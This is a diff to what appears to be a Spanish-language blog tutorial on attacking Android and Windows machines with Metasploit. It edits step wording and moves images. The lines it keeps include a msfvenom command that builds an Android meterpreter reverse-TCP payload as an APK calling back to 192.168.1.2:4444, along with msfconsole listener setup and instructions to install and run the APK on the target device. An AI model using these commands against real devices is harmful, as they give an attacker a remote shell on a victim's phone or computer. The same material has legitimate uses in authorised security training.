@@ -29,7 +29,7 @@ generar payload:
 
     msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 R > /sdcard/miapk.apk
 
-abrimos la consola:
+abrimos la consola de metasploit:
 
     msfconsole
 
@@ -46,15 +46,16 @@ preparamos metasploit:
     
     set lport 4444
 ```
-instalamos y ejecutamos el apk en el android a atacar:
-
-<img src="{{ "/assets/img/apk.jpg" | relative_url }}" alt="{{ site.plainwhite.name }}">
 
 ejecutamos el exploit:
 
     exploit
     
 <img src="{{ "/assets/img/exploit.jpg" | relative_url }}" alt="{{ site.plainwhite.name }}">
+
+instalamos y ejecutamos el apk en el android a atacar:
+
+<img src="{{ "/assets/img/apk.jpg" | relative_url }}" alt="{{ site.plainwhite.name }}">
 
 
 ### Ataque a windows
@@ -87,9 +88,8 @@ preparamos metasploit:
 
     set lport 4444
 
-ejecutamos la aplicacion de escritorio en el windows a atacar:
+ejecutamos la aplicacion de escritorio en el windows a atacar
 
-<img src="{{ "/assets/img/app.jpg" | relative_url }}" alt="{{ site.plainwhite.name }}">
 
 ejecutamos el exploit:
 
